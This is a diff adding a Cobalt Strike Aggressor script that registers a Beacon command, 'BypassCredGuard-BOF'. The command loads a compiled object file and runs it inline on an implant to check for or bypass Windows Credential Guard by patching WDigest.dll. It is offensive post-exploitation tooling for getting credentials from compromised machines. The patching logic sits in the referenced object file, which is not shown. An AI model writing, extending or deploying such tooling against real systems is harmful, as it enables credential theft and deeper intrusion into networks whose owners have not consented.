@@ -1,0 +1,38 @@
+beacon_command_register(
+    "BypassCredGuard-BOF", 
+    "Bypass Credential Guard by patching WDigest.dll.", 
+    "Synopsis: BypassCredGuard-BOF [check | patch]\n"
+);
+
+sub BypassCredGuardExp {
+    local('$bid $handle $data $args');
+	$bid = $1;
+	
+    $handle = openf(script_resource("BypassCredGuard.". barch($bid).".obj"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    $args = bof_pack($bid, "z", $2);
+    btask($bid, "Task to run BypassCredGuard-BOF");
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+alias BypassCredGuard-BOF {
+
+	
+    if(size(@_) != 2)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("BypassCredGuard-BOF"));
+        return;
+    }
+
+	if (("check" eq $2) || ("patch" eq $2))
+	{
+	    BypassCredGuardExp($1, $2);
+	}
+	else {
+        berror($1, beacon_command_detail("BypassCredGuard-BOF"));
+        return;
+	}
+}
